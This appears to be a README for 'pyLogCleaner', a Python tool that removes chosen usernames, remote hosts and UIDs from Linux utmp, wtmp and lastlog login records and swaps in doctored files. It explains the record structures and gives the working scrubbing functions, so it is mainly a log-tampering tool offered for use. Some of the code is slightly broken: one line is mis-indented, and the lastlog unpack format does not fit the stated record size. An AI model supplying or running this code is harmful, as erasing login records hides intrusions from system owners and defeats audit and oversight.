pyLogCleaner
============

Linux Log Cleaner (wtmp, utmp &amp; lastlog)

This python script will scrub (by replacing the current log files with altered ones) the utmp, wtmp & lastlog files. In order to do this we have to know the size and type of structure the data is kept it. We must know the size so we can determine the correct size "chunks" to read, and the structure to determine where (at what numerical index) the data we are searching for is stored. The structure of utmp/wtmp is

struct utmp {
               short   ut_type;              /* Type of record */
               pid_t   ut_pid;               /* PID of login process */
               char    ut_line[UT_LINESIZE]; /* Device name of tty - "/dev/" */
               char    ut_id[4];             /* Terminal name suffix,
                                                or inittab(5) ID */
               char    ut_user[UT_NAMESIZE]; /* Username */
               char    ut_host[UT_HOSTSIZE]; /* Hostname for remote login, or
                                                kernel version for run-level
                                                messages */
               struct  exit_status ut_exit;  /* Exit status of a process
                                                marked as DEAD_PROCESS; not
                                                used by Linux init(8) */
               /* The ut_session and ut_tv fields must be the same size when
                  compiled 32- and 64-bit.  This allows data files and shared
                  memory to be shared between 32- and 64-bit applications. */

           #if __WORDSIZE == 64 && defined __WORDSIZE_COMPAT32
               int32_t ut_session;           /* Session ID (getsid(2)),
                                                used for windowing */
               struct {
                   int32_t tv_sec;           /* Seconds */
                   int32_t tv_usec;          /* Microseconds */
               } ut_tv;                      /* Time entry was made */
           #else
                long   ut_session;           /* Session ID */
                struct timeval ut_tv;        /* Time entry was made */
           #endif

               int32_t ut_addr_v6[4];        /* Internet address of remote
                                                host; IPv4 address uses
                                                just ut_addr_v6[0] */
               char __unused[20];            /* Reserved for future use */
           };


(taken from kernel.org). In order to break-up this datastructure into an numerically indexed array, we perform the following unpack (in bold)

def scrubFile(filePath):
  newUtmp = ""
  with open(filePath, "rb") as f:
    bytes = f.read(UTMP_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
      if cut(data[4]) != usernameToRemove and cut(data[5]) != hostAddressToRemove:
          newUtmp += bytes
      bytes = f.read(UTMP_STRUCT_SIZE)
  f.close()
  return newUtmp


Which allows us to do the check for the username & address at [4] and [5]. To handle lastlog we again must know the datastructure and size

struct lastlog
{
#if __WORDSIZE == 64 && defined __WORDSIZE_COMPAT32
  int32_t ll_time;
#else
  __time_t ll_time; // 4
#endif
char ll_line[UT_LINESIZE]; // 32
char ll_host[UT_HOSTSIZE]; // 256
};
# which is 292 bytes.


Lastlog is unique in that each entry in the file (the first index) corresponds with a UID. So as we iterate over each entry we check the 'index/id' against the desired UID and if they match, we do not copy that entry from the current lastlog file to the new, doctored file.

def scrubLastlogFile(filePath, userName):
  pw = pwd.getpwnam(userName)
uid= pw.pw_uid
  idCount = 0
  newLastlog = ''
  
  with open(filePath, "rb") as f:
    bytes = f.read(LASTLOG_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hh32s256s", bytes)
      if (idCount != uid):
        newLastlog += bytes
      idCount += 1
      bytes = f.read(LASTLOG_STRUCT_SIZE)
  return newLastlog


That's about it - nothing ground breaking here. At the time there wasn't an open source python implementation of utmp/wtmp/lastlog cleaning, so I wrote one. 